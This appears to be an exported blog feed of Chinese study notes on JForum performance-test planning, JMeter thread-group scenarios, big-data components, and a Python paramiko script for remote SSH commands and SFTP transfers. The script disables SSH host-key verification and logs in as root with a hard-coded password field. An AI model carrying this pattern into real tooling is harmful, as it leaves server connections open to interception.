<li><p>为了更准确地模拟生产环境负载，在物理架构上尽量保持与生产同步，在机器配置及数量上，可以缩小比例，由测试环境来推算出生产环境的性能。（如何用测试环境准确估算到生产环境，参考TPC-E标准进行评测）</p>
</li>
</ul>
<h3 id="逻辑架构"><a href="#逻辑架构" class="headerlink" title="逻辑架构"></a>逻辑架构</h3><p><img src="/aposts/da937c73/image-20211019170654795.png" alt="image-20211019170654795"></p>
<ul>
<li>逻辑架构：逻辑架构展现的是软件系统中元件之间的关系，比如用户界面、数据库、外部系统结构等。下图是应用服务的逻辑结构，列出了系统服务组件、邮件服务、权限管理、业务服务（对于JForum 就是发帖、回帖、浏览帖子）。Web层是通过 JSP 与 Velocity Freemark 来展现的。       </li>
<li>通过逻辑架构能迅速了解到系统的主要功能与服务，并且知道其逻辑关系，有助于我们设计测试场景</li>
</ul>
<h3 id="业务流程"><a href="#业务流程" class="headerlink" title="业务流程"></a>业务流程</h3><ul>
<li>确定系统的主要业务流程，方便写性能测试用例。</li>
</ul>
<p><img src="/aposts/da937c73/image-20211019170922072.png" alt="image-20211019170922072"></p>
<p><strong>需求文档中性能需求说明：</strong></p>
<ul>
<li><p>此论坛为一个技术讨论性质的论坛，注册用户规模预计是10万，每日活跃用户数预计为5%，即5000.</p>
</li>
<li><p>用户在论坛中的活动以浏览、发帖及回帖为主，日 PV 预计为 2 万 PV。其中浏览、发帖、回帖比例大约为 7:1:2.</p>
<ul>
<li>PV：用户每访问一个页面统计为一个PV。</li>
</ul>
<p>　</p>
</li>
<li><p>系统业务增长率为 30%，系统在 3年内不打算进行分库分表处理，需要系统在性能上能够支撑住，也就是测试时需要3年的存量数据。</p>
</li>
<li><p>要求系统能够提供良好的系统体验，比如浏览帖子、发帖、回帖应该控制在3秒内。</p>
</li>
<li><p>为了系统稳定，要求在日常营运时 CPU 使用率&lt;70%，磁盘 Disk ime&lt;70%且无网络瓶颈。</p>
</li>
</ul>
<p>　</p>
<p><img src="/aposts/da937c73/image-20211019171133583.png" alt="image-20211019171133583"></p>
<h3 id="硬件指标"><a href="#硬件指标" class="headerlink" title="硬件指标"></a>硬件指标</h3><ul>
<li>系统硬件指标对象是硬件资源，比如CPU、内存、磁盘、网络带宽等。下表列出了主要的性能指标及阈值，这些指标比较抽象，在监控分析时应该进一步细化；比如 CPU的性能指标在 Linux 中分为用户利用率、系统利用率及平均负载等重要指标。</li>
</ul>
<p><img src="/aposts/da937c73/image-20211019171302664.png" alt="image-20211019171302664"></p>
<h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><ul>
<li>需求分析的目的是确定性能测试范围，分析出哪些业务纳入性能测试范围及性能指标是什么？另外要分析用户使用行为、业务分布、分析业务量；估算出 TPS与并发用户数等性能测试执行依据。</li>
</ul>
<h3 id="圈定测试范围"><a href="#圈定测试范围" class="headerlink" title="圈定测试范围"></a>圈定测试范围</h3><p>如何圈定测试范围？</p>
<ul>
<li><p>（1）确定高频次的业务</p>
</li>
<li><p>（2)确定性能影响大的业务</p>
</li>
<li><p>（3）确定此功能的可验证性。比如使用支付宝来支付商品费用，如果余额不足，会引导选择使用银行卡来支付。这样支付宝会调用银行的接口来完成银行账户的扣减。银行的接口不提供支持时，需要模拟银行网关这个过程，这就是可验证性分析及解决方案，最终采用 Mock程序来配合测试。</p>
</li>
</ul>
<h3 id="明确性能指标"><a href="#明确性能指标" class="headerlink" title="明确性能指标"></a>明确性能指标</h3><ul>
<li>（1）吞吐量（PV、TPS）：</li>
</ul>
<p>　　　　　日 PV 是 2 万，3年 30%的增长，日 PV&#x3D;2*（1+30%）² ≈3.38万</p>
<ul>
<li><p>（2）响应时间：要求3秒以内</p>
</li>
<li><p>（3） 成功率：99%以上</p>
</li>
<li><p>（4）稳定波动正常范围</p>
</li>
<li><p>（5）其他各项硬件等性能指标。参照硬件指标</p>
</li>
</ul>
<h3 id="分析业务量"><a href="#分析业务量" class="headerlink" title="分析业务量"></a>分析业务量</h3><ul>
<li><p>测试数据的多少对测试结果会有影响，特别是数据成千万上亿条后，性能影响明显。</p>
</li>
<li><p>性能测试时，除了需要做足一定数量的历史数据，还得关注业务量的增长。需求中年业务增长率 30%，可以理解成年 PV 也会增加 30%。所以测试时要以第3年的业务量为标准来测试，避免错过积累一定数据后性能变差的情况，把问题提前暴露出来。</p>
</li>
</ul>
<h4 id="计算-TPS"><a href="#计算-TPS" class="headerlink" title="计算 TPS"></a>计算 TPS</h4><ul>
<li><p>TPS：表示每秒平均事务数。即吞吐量。</p>
</li>
<li><p>上面分析业务量的数据是以PV来统计的，要计算 TPS ，需要把 PV 转化成 TPS。一个 PV即是对服务器的一次请求，把一个请求放在一个事务中来统计服务器的响应耗时，响应完成即是一次事务完成，这么说一个 PV 即是一个事务（PV 并不能直接等同于 TPS，PV代表了一次客户请求，这次请求可能请求了很多信息，比如图片、样式、JS信息等，发新帖时我们通常只关心发帖的动作耗时，并不关心页面刷新时 JS、样式的耗时，此时就把 PV 等同于 TPS)；比如一个功能页面（浏览帖子）一秒会有 10 个 PV，那么此功能的 TPS 即为10。</p>
</li>
<li><p>TPS一般要取系统业务高峰期的值，虽然系统不是总处在高峰期，但高峰期 TPS 才能代表系统的实际处理能力。要得到高峰期的 TPS 我们需要分析业务发生时间。</p>
</li>
<li><p>UV：一天之内网站独立访客数（以 Cookie 为依据），一天内同一访客多次访问网站只计算 1 个访客（小于等于 PV）。</p>
</li>
<li><p>回到示例项目Jforum，找出日高峰。下表是高峰日 Jforum 论坛的 PV 数据统计（业务量单位为 PV）。</p>
</li>
</ul>
<p><img src="/aposts/da937c73/image-20211019171719859.png" alt="image-20211019171719859"></p>
<ul>
<li><p>综合看上午十点是访问高峰，PV约为 5208（登录、浏览、回帖、发帖合计），那么这个时段 TPS&#x3D;5208&#x2F;3600≈1.45.</p>
</li>
<li><p>这样取平均值是不合适的，一个小时间隔时间太长，采集的业务数据并没有说明在这一个小时中吞吐量是平均的，还需要细分。如果能细分到每分钟的业务量数量，那 TPS 的估算就越准确。</p>
</li>
<li><p>可以采取 80&#x2F;20 原则来估算，在性能测试中，20%的时间做了 80%的事情。</p>
</li>
<li><p>80&#x2F;20 原则计算<code> TPS = 5208*80% / (3600*20%) ≈ 5.8</code>　，具体如下表</p>
<ul>
<li>登录的<code>tps=1300*0.8/720=1.4444</code></li>
</ul>
</li>
</ul>
<p><img src="/aposts/da937c73/image-20211020172516176.png" alt="image-20211020172516176"></p>
<ul>
<li>tps还可以用来计算并发数</li>
</ul>
<h2 id="并发数计算"><a href="#并发数计算" class="headerlink" title="并发数计算"></a>并发数计算</h2><ul>
<li>三种估算方式：1.tps进行估算（我们采用这种） 2.由在线活动用户数估算 3.根据经验估算</li>
<li>TPS&#x3D;事务数&#x2F;时间，假设所有的事务都来自不同的用户，那么并发数&#x3D;事务数&#x3D;tps<em>时间。</em></li>
<li>vu&#x3D;tps*(runtime+thinktime)<ul>
<li>vu表示此业务的虚拟用户数，即并发数</li>
<li>runtime是测试程序&#x2F;脚本运行一次所消耗的时间，包含事务时间+非事务时间</li>
<li>thinktime是模拟用户思考或者填写表单消耗的时间；</li>
</ul>
</li>
<li>下图是发帖动作伪代码</li>
</ul>
<p><img src="/aposts/da937c73/image-20211019173149581.png" alt="image-20211019173149581"></p>
<ul>
<li><p>根据公式我们计算一下 Vu，上面计算TPS 为5.8</p>
</li>
<li><p>不包括非事务时间(ThinkTime 与程序消耗时间)情况下计算 VU; </p>
<ul>
<li><code>Vu=TPS*T2=5.8*2=12</code></li>
</ul>
</li>
<li><p>包括非事务时间情况下计算 VU。</p>
<ul>
<li><code>Vu=TPS*(Runtime+ThinkTime)=5.8*(0.2+2+0.2+0.2+0.2+2+0.2+2+2)=53</code></li>
</ul>
</li>
<li><p>可以看到两者之间的 Vu 数量相差巨大，如果我们不把 Runtime 与 ThinkTime 加进去，算出来的12个并发用户在测试执行时很有可能无法达到 TPS&#x3D;5.8 的目标。</p>
</li>
<li><p>业内一般把 Think Time 设为 3 秒，3 秒刚好符合用户在页面的停留平均时间。那么我们巴上面的 Think Time 时间换成3 秒。测试需求中要求响应时间小于3秒，那么我们以3秒为阀值。<br><code>VU=TPS*(Runtime+ThinkTime)=5.8*(T1+TT1+T2+T3+T4+T5+TT2+T6+T7)=5.802+3+3+0.2+0.2+0.2+3+3+0.2)=76。</code></p>
</li>
<li><p>由于我们计算并发数，取得是系统的tps（登录，浏览，发帖，回帖），实际计算出来的并发是系统业务的总并发数，如登录的并发数量<code>1.44*13=18.72</code>向上取值就算19，需要按比例分配到不同的业务中，</p>
</li>
</ul>
<p><img src="/aposts/da937c73/image-20211019174220077.png" alt="image-20211019174220077"></p>
<p><strong>本次文章抄录于《6 全栈性能测试修炼宝典JMeter实战》</strong></p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>混合场景Stepping Thread Group</title>
    <url>/aposts/d39845c4/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p>本次主要用梯次压测模式进行负载测试</p>
</li>
<li><p>有浏览帖子，回复帖子等场景</p>
</li>
<li><p>随着版本的迭代，已经有更好的线程组代替<code>Stepping Thread Group</code>了【<code>Concurrency Thread Group</code>】，所以说<code>Stepping Thread Group</code>已经是过去式了</p>
</li>
</ul>
<h2 id="场景设计"><a href="#场景设计" class="headerlink" title="场景设计"></a>场景设计</h2><ul>
<li><p>参数化设置</p>
<p><img src="/aposts/d39845c4/image-20211109091445660.png" alt="image-20211109091445660"></p>
</li>
<li><p>回复，发布帖子内容的自定义变量</p>
<p><img src="/aposts/d39845c4/image-20211109091533830.png" alt="image-20211109091533830"></p>
</li>
</ul>
<h3 id="浏览帖子设置"><a href="#浏览帖子设置" class="headerlink" title="浏览帖子设置"></a>浏览帖子设置</h3><ul>
<li><p>共启动40个线程，每隔2秒启动5个线程（表示每个梯次启动 5个线程）且持续运行10秒（每个梯次启动 5个线程）,达到40线程再次运行30秒</p>
</li>
<li><p>可以看到负载预览图是设置后的效果</p>
<p><img src="/aposts/d39845c4/image-20211109093758322.png" alt="image-20211109093758322"></p>
</li>
<li><p><strong>this group will start：</strong>表示总共要启动的线程数；表示总共会加载到 40个线程</p>
</li>
<li><p><strong>first，wait for：</strong>从运行之后多长时间开始启动线程；若设置为 0 秒，表示运行之后立即启动线程</p>
</li>
<li><p><strong>then start：</strong>初次启动多少个线程；若设置为 0 个，表示初次不启动线程</p>
</li>
<li><p><strong>next add：</strong>之后每次启动多少个线程；若设置为 5个，表示每个梯次启动 5个线程</p>
</li>
<li><p><strong>threads every：</strong>当前运行多长时间后再次启动线程，即每一次线程启动完成之后的持续时间；若设置为 10秒，每梯次启动完线程之后再运行 10秒</p>
</li>
<li><p><strong>using ramp-up：</strong>启动线程的时间；若设置为 2秒，表示每次启动线程都持续 2 秒（和基础线程组的ramp-up一样意思）</p>
</li>
<li><p><strong>then hold load for：</strong>线程全部启动完之后持续运行多长时间，设置为 10 秒，表示 40个线程全部启动完之后再持续运行 10秒(以每梯次5次)</p>
</li>
<li><p><strong>finally，stop&#x2F;threads every：</strong>多长时间释放多少个线程；若设置为 5 个和 1 秒，表示持续负载结束之后每 1 秒钟释放 5 个线程，<strong>【注意：线程释放过程中，线程依然在运行】</strong></p>
</li>
</ul>
<h2 id="其他场景"><a href="#其他场景" class="headerlink" title="其他场景"></a>其他场景</h2><ul>
<li>省略</li>
</ul>
<h2 id="Active-Threads-Over-Time"><a href="#Active-Threads-Over-Time" class="headerlink" title="Active Threads Over Time"></a>Active Threads Over Time</h2><ul>
<li>新增监听器，<code>Active Threads Over Time</code>，看到的效果和<code>Stepping Thread Group</code>中的负载预览图一致</li>
</ul>
<p><img src="/aposts/d39845c4/image-20211109094438411.png" alt="image-20211109094438411"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>这里之前纠结一个奇葩问题，不了解<code>Stepping Thread Group</code>运行机制，手动计算发送请求后和实际发送请求对不上，因此希望其他人不要和我一样</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>混合场景单线程组</title>
    <url>/aposts/1e744d3a/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本次混合场景为单个线程组</li>
<li>结合if控制器，计数器，循环控制器</li>
<li>jmeter v5.4.1</li>
<li>自己搭建的jforum</li>
<li>场景为：登录20:浏览帖子:40:回帖:15:发帖10，比例为：5:8:3:2</li>
</ul>
<h2 id="设置线程组"><a href="#设置线程组" class="headerlink" title="设置线程组"></a>设置线程组</h2><ul>
<li>每秒钟并发两个登录请求，循环10次，也就是共发20次登录</li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211102180619354.png" alt="image-20211102180619354"></p>
<ul>
<li><p>参数化数据设置，注意的是线程共享模式</p>
<ul>
<li>所有线程，默认选项，表示按照顺序执行，不会出现多次登录使用同一个用户，<strong>《全栈性能测试修炼宝典JMeter实战》书中作者，自己实现此功能，可能是书中用的jmeter版本比较老，新版本已经有了此功能</strong></li>
<li>当前线程，在这种情况下，每个用户都会从头到尾读取 CSV 文件。</li>
<li>当前线程组，每个文件由每个线程组单独打开（不要与每个线程单独读取文件的“当前线程”混淆。这基本上意味着每个线程组中的每个线程从头到尾读取 CSV 文件，互不影响。要实际展示这种共享模式，您需要再创建一个线程组。</li>
<li>更详细说明请参考<a href="https://www.blazemeter.com/blog/csv-data-set-config-in-sharing-mode-made-easy">这篇文章</a></li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211103094204881.png" alt="image-20211103094204881"></p>
</li>
<li><p>新增了一个登录计数器</p>
<p><img src="/aposts/1e744d3a/image-20211103095147850.png" alt="image-20211103095147850"></p>
</li>
</ul>
<h2 id="登录简单控制器"><a href="#登录简单控制器" class="headerlink" title="登录简单控制器"></a>登录简单控制器</h2><ul>
<li>登录成功后把模块id提出来</li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211103095319643.png" alt="image-20211103095319643"></p>
<h2 id="进入板块的if控制器"><a href="#进入板块的if控制器" class="headerlink" title="进入板块的if控制器"></a>进入板块的if控制器</h2><ul>
<li><p>按照每登录4次的比例对帖子进行操作</p>
<p><img src="/aposts/1e744d3a/image-20211103095436383.png" alt="image-20211103095436383"></p>
</li>
</ul>
<h3 id="浏览帖子循环控制器"><a href="#浏览帖子循环控制器" class="headerlink" title="浏览帖子循环控制器"></a>浏览帖子循环控制器</h3><ul>
<li>循环8次，刚好为共浏览<code>5*8=40</code>次，提取帖子id，最后进入到帖子详情</li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211103095727165.png" alt="image-20211103095727165"></p>
<h3 id="回复帖子循环控制器"><a href="#回复帖子循环控制器" class="headerlink" title="回复帖子循环控制器"></a>回复帖子循环控制器</h3><ul>
<li>循环次数为3次，共发送<code>3*5=15</code></li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211103100141261.png" alt="image-20211103100141261"></p>
<h3 id="发帖循环控制器"><a href="#发帖循环控制器" class="headerlink" title="发帖循环控制器"></a>发帖循环控制器</h3><ul>
<li>循环2次，共发送<code>2*5=10</code>次</li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211103100343560.png" alt="image-20211103100343560"></p>
<h2 id="查看运行结果"><a href="#查看运行结果" class="headerlink" title="查看运行结果"></a>查看运行结果</h2><ul>
<li>发送的请求数量刚好对上</li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211103100519007.png" alt="image-20211103100519007"></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul>
<li><p>今天在测试过程中，发现这样的脚本用问题，直接多次回帖和发帖子虽然请求成功了，但是没有插入数据库，用抓包的方式也是如此</p>
</li>
<li><p>后续经过测试，要改成这样的流程，不能单独循环发帖&#x2F;回帖：</p>
<ul>
<li>发帖：进入板块，选择发帖按钮，发送发帖请求</li>
<li>回帖：进入板块，选择帖子，点击回复帖子，发送回帖请求</li>
</ul>
<p><img src="/aposts/1e744d3a/image-20211111175757903.png" alt="image-20211111175757903"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>用paramiko远程监控,下载，上传服务器</title>
    <url>/aposts/41c3847c/</url>
    <content><![CDATA[<ul>
<li>安装<a href="http://www.jianshu.com/p/b722356b3bfc">paramiko</a></li>
<li>代码如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import paramiko</span><br><span class="line">import paramiko</span><br><span class="line">server_ip = &#x27;192.168.1.1&#x27;</span><br><span class="line">server_user = &#x27;root&#x27;</span><br><span class="line">server_passwd = &#x27;&#x27;</span><br><span class="line">server_port = 22</span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">def ssh_connect():</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    ssh.load_system_host_keys()</span><br><span class="line">    ssh.connect(server_ip, server_port,server_user, server_passwd)</span><br><span class="line">    return ssh</span><br><span class="line">def client_connect():</span><br><span class="line">    client = paramiko.Transport((server_ip, server_port))</span><br><span class="line">    client.connect(username = server_user, password = server_passwd)</span><br><span class="line">    return client</span><br><span class="line">def ssh_disconnect(client):</span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line">def exec_cmd(command, ssh):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    windows客户端远程执行linux服务器上命令</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    stdin, stdout, stderr = ssh.exec_command(command)</span><br><span class="line">    err = stderr.readline()</span><br><span class="line">    out = stdout.readline()</span><br><span class="line">    print(stdout.read())</span><br><span class="line"></span><br><span class="line">def win_to_linux(localpath, remotepath,client):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    windows向linux服务器上传文件.</span><br><span class="line">    localpath  为本地文件的绝对路径。如：D:  est.py</span><br><span class="line">    remotepath 为服务器端存放上传文件的绝对路径,而不是一个目录。如：/tmp/my_file.txt</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(client)</span><br><span class="line">    sftp.put(localpath,remotepath)</span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line">def linux_to_win(localpath, remotepath,client):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    从linux服务器下载文件到本地</span><br><span class="line">    localpath  为本地文件的绝对路径。如：D:  est.py</span><br><span class="line">    remotepath 为服务器端存放上传文件的绝对路径,而不是一个目录。如：/tmp/my_file.txt</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(client)</span><br><span class="line">    sftp.get(remotepath, localpath)</span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line">class AllowAllKeys(paramiko.MissingHostKeyPolicy):</span><br><span class="line">   def missing_host_key(self, client, hostname, key):</span><br><span class="line">       return</span><br><span class="line"></span><br><span class="line">def muit_exec_cmd(ssh,cmd):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    ssh ssh连接</span><br><span class="line">    cmd 多命名</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    ssh.set_missing_host_key_policy(AllowAllKeys())</span><br><span class="line">    channel = ssh.invoke_shell()</span><br><span class="line">    stdin = channel.makefile(&#x27;wb&#x27;)</span><br><span class="line">    stdout = channel.makefile(&#x27;rb&#x27;)</span><br><span class="line"></span><br><span class="line">    stdin.write(cmd)</span><br><span class="line">    print(stdout.read())</span><br><span class="line"></span><br><span class="line">    stdout.close()</span><br><span class="line">    stdin.close()</span><br><span class="line"></span><br><span class="line">cl = client_connect()</span><br><span class="line">sh = ssh_connect()</span><br><span class="line">muit_exec_cmd(sh,&#x27;&#x27;&#x27;</span><br><span class="line">    cd ~</span><br><span class="line">    ls</span><br><span class="line">    sar</span><br><span class="line">    exit</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br><span class="line">win_to_linux(&quot;t.txt&quot;,&quot;/data/t1.txt&quot;,cl)</span><br><span class="line">cl.close()</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>第一章 大数据技术生态</title>
    <url>/aposts/f05ef477/</url>
    <content><![CDATA[<h1 id="大数据技术生态"><a href="#大数据技术生态" class="headerlink" title="大数据技术生态"></a>大数据技术生态</h1><blockquote>
<p>本文主要抄录《大数据测试技术与实践》</p>
</blockquote>
<p>由下而上可以划分为：</p>
<ul>
<li>数据采集<ul>
<li>关系与非关系数据采集组件，分布式消息队列等，如kafka、sqoop</li>
</ul>
</li>
<li>数据存储<ul>
<li>分布式存储系统、关系和非关系数据库等，如HDFS、MySQL</li>
</ul>
</li>
<li>管理调度<ul>
<li>资源管理和调度YARN，容器Kubernetes、服务协调zookeeper、工作流调度平台（如Azkaban）等</li>
</ul>
</li>
<li>计算机分析<ul>
<li>批处理（MapReduce）、流计算(Flink)、查询分析(Impala)和图计算(Gelly)等</li>
</ul>
</li>
<li>组件应用<ul>
<li>各种数据分析和机器学习工具，如Hive、Pig、TensorFlow</li>
</ul>
</li>
</ul>
<h2 id="大数据采集计算"><a href="#大数据采集计算" class="headerlink" title="大数据采集计算"></a>大数据采集计算</h2><ul>
<li>系统日志采集，如kafka、Flume</li>
<li>网络数据采集，如爬虫</li>
<li>其他数据采集</li>
</ul>
<h2 id="大数据存储计算"><a href="#大数据存储计算" class="headerlink" title="大数据存储计算"></a>大数据存储计算</h2><h3 id="分布式文件系统-HDFS"><a href="#分布式文件系统-HDFS" class="headerlink" title="分布式文件系统 HDFS"></a>分布式文件系统 HDFS</h3><ul>
<li><p>主要解决大数据存储问题</p>
</li>
<li><p>GFS（Google File System）的开源实现</p>
</li>
<li><p>Hadoop两大核心组成部分之一，另外一个是MapReduce</p>
</li>
<li><p>遵循主从（master&#x2F;salve）框架</p>
</li>
<li><p>可以由单台服务器扩展到数千台服务器</p>
</li>
<li><p>NameNode关联和维护HDFS文件系统的读写操作</p>
</li>
<li><p>多个DataNode1负责存储数据</p>
</li>
</ul>
<p><img src="/aposts/f05ef477/image-20211201095407758.png" alt="image-20211201095407758"></p>
<h4 id="HDFS优点"><a href="#HDFS优点" class="headerlink" title="HDFS优点"></a>HDFS优点</h4><ul>
<li>具有高度容错能力，能实时监测错误并且自动恢复。<ul>
<li>类似于服务器的容灾能力，当某台服务器挂了，就启用备用服务器，进行数据同步</li>
</ul>
</li>
<li>数据存储为Streaming流式数据存储 。批处理数据，而不是实时处理，提高了大量处理数据的能力，但是会<strong>牺牲响应时间</strong></li>
<li>大数据集。提供了<a href="https://links.jianshu.com/go?to=%5Bhttps://www.ibm.com/developerworks/cn/linux/cluster/lw-clustering.html%5D(https://www.ibm.com/developerworks/cn/linux/cluster/lw-clustering.html)">cluster</a>集群架构，集群可扩展为数百个节点</li>
<li>数据简单一致性。一次性写入多次读取，一个文件创建后就不可再修改，这样可以简化数据一致性</li>
<li>跨硬件和跨软件。平台的可移植性</li>
</ul>
<h3 id="海量数据列式存储：Hbase"><a href="#海量数据列式存储：Hbase" class="headerlink" title="海量数据列式存储：Hbase"></a>海量数据列式存储：Hbase</h3><ul>
<li><p>HDFS容错率很高，即便是在系统崩溃的情况下，也能够在节点之间快速传输数据。<strong>HBase是非关系数据库，是开源的Not-Only-SQL数据库</strong>，它的运行<strong>建立在Hadoop上</strong>。HBase依赖于CAP定理(Consistency, Availability, and Partition Tolerance）中的CP项</p>
</li>
<li><p>HDFS最适于执行批次分析。然而，<strong>它最大的缺点是无法执行实时分析</strong>，而实时分析是信息科技行业的标配。<strong>HBase能够处理大规模数据，它不适于批次分析，但它可以向Hadoop实时地调用数据</strong>。</p>
</li>
<li><p>HDFS和HBase都可以处理结构、半结构和非结构数据。因为HDFS建立在旧的MapReduce框架上，所以它缺乏内存引擎，数据分析速度较慢。相反，HBase使用了内存引擎，大大提高了数据的读写速度。</p>
</li>
<li><p>HDFS执行的数据分析过程是透明的。HBase与之相反，因为其结构基于NoSQL，它通过在不同的关键字下进行排序而获取数据。</p>
</li>
</ul>
<p><img src="/aposts/f05ef477/image-20211201100832525.png" alt="image-20211201100832525"></p>
<h2 id="大数据分析技术"><a href="#大数据分析技术" class="headerlink" title="大数据分析技术"></a>大数据分析技术</h2><ul>
<li>批处理计算。针对大规模数据的批量处理，主要代表产品有MapReduce、Spark</li>
<li>流计算。针对流数据的实时计算，主要代表产品有，Spark Streaming、Flink 、Storm等</li>
<li>查询分析计算。针对大规模数据的存储管理和查询分析，主要代表产品有Hive、Impala等</li>
<li>图计算。针对大规模图结构数据的处理，主要代表产品有Pregel、Gelly等</li>
</ul>
<h3 id="批处理计算-MapReduce"><a href="#批处理计算-MapReduce" class="headerlink" title="批处理计算-MapReduce"></a>批处理计算-MapReduce</h3><ul>
<li><p>进行大量数据处理时，用MapReduce进行分布式计算，这样可大量减少计算时间，还有Spark、Pig等就是类似的代表产品或技术</p>
</li>
<li><p>Map将任务分割成更小任务，由每台服务器分别执行</p>
</li>
<li><p>Reduce将所有服务器返回的结果汇总，整理成最终结果</p>
</li>
</ul>
<p><img src="/aposts/f05ef477/image-20211201102027603.png" alt="image-20211201102027603"></p>
<h3 id="流计算"><a href="#流计算" class="headerlink" title="流计算"></a>流计算</h3><ul>
<li><p>流式处理假设数据的潜在价值是数据的<strong>新鲜度、实时性</strong>，需要尽快处理得到结果。在这种方式下，数据以流的方式到达。在数据连续到达的过程中，由于流携带了大量数据，只有小部分的流数据被保存在有限的<strong>内存中</strong>。流处理方式用于在线应用，通常工作在<strong>秒或毫秒级</strong>别。</p>
</li>
<li><p>目前主流的流处理组件包括：<strong>Strom</strong>、<strong>Spark Streaming</strong>、KafKa、Flume、<strong>Flink</strong>、S3等</p>
<ul>
<li>Spark 和 Strom、Flink对比，无法在对实施要求很高的流处理场景中</li>
</ul>
</li>
</ul>
<p><img src="/aposts/f05ef477/image-20211201104503379.png" alt="image-20211201104503379"></p>
<h3 id="OLAP引擎"><a href="#OLAP引擎" class="headerlink" title="OLAP引擎"></a>OLAP引擎</h3><ul>
<li>即联机分析处理。OLAP对业务数据执行多维分析，并提供复杂计算，趋势分析和复杂数据建模的能力。它主要用于支持企业决策管理分析，是许多商务智能（BI）应用程序背后的技术。</li>
<li>目前开源的引擎很多，如Hive、Impala、Persto等</li>
</ul>
<h4 id="Hive"><a href="#Hive" class="headerlink" title="Hive"></a>Hive</h4><p><img src="/aposts/f05ef477/image-20211201111306662.png" alt="image-20211201111306662"></p>
<h4 id="其他参考"><a href="#其他参考" class="headerlink" title="其他参考"></a>其他参考</h4><ul>
<li><a href="https://blog.csdn.net/qq_43665254/article/details/112552106">Hive SQL vs SQL 区别</a></li>
</ul>
<h2 id="大数据管理调度技术"><a href="#大数据管理调度技术" class="headerlink" title="大数据管理调度技术"></a>大数据管理调度技术</h2><h3 id="分布式集群资源调度框架-YARN"><a href="#分布式集群资源调度框架-YARN" class="headerlink" title="分布式集群资源调度框架-YARN"></a>分布式集群资源调度框架-YARN</h3><ul>
<li>针对Hadoop1.0中MR的不足，引入了Yarn框架。Yarn框架中将JobTracker资源分配和作业控制分开，分为Resource Manager(RM)以及Application Master(AM)。</li>
<li>Hadoop的MapReduce架构称为<a href="https://links.jianshu.com/go?to=%5Bhttp://hadoop.apache.org/docs/current/hadoop-yarn/hadoop-yarn-site/YARN.html%5D(http://hadoop.apache.org/docs/current/hadoop-yarn/hadoop-yarn-site/YARN.html)">YARN</a>(另一种资源协助者)，是效率更高的资源管理器核心</li>
<li>Client客户端，用户向Resource Manage请求执行运算</li>
<li>在NameNode会有Resource Manage统筹管理运算请求</li>
<li>在其他的DateNode会有 Node Manager负责运行，监督每个任务运行情况，并向Resource Manage 汇报状态</li>
</ul>
<p><img src="/aposts/f05ef477/image-20211201102156648.png" alt="image-20211201102156648"></p>
<h3 id="容器管理系统：Kubernetes"><a href="#容器管理系统：Kubernetes" class="headerlink" title="容器管理系统：Kubernetes"></a>容器管理系统：Kubernetes</h3><ul>
<li>常见的大数据技术组件一般有对应的开源项目支持部署，如Flink，Spark也有官方支持Spark on Kubernetes运行模式等</li>
</ul>
<h3 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h3><ul>
<li><p>是大数据的动物管理员，是一个开源的分布式的，是Hadoop的一个子项目</p>
</li>
<li><p>Zookeeper从设计模式角度来理解：是一个基于观察者模式设计的分布式服务管理框架，它负责存储和管理大家都关心的数据，然后接受观察者的注册，一旦这些数据的状态发生变化，Zookeeper就将负责通知已经在Zookeeper上注册的那些观察者做出相应的反应，从而实现集群中类似Master&#x2F;Slave管理模式</p>
</li>
<li><p><strong>Zookeeper&#x3D;文件系统+通知机制</strong></p>
</li>
</ul>
<h3 id="常用的工作流调度平台"><a href="#常用的工作流调度平台" class="headerlink" title="常用的工作流调度平台"></a>常用的工作流调度平台</h3><ul>
<li>对于简单的任务调度，可以使用Linux Crontab，但是对于在多台机器上、任务之前有依赖关系时，Linux Crontab就不能满足需求，因此需要分布式任务调度系统来进行任务编排</li>
<li>业界常用开源调度平台有：Azkaban、Oozie、Airflow等</li>
</ul>
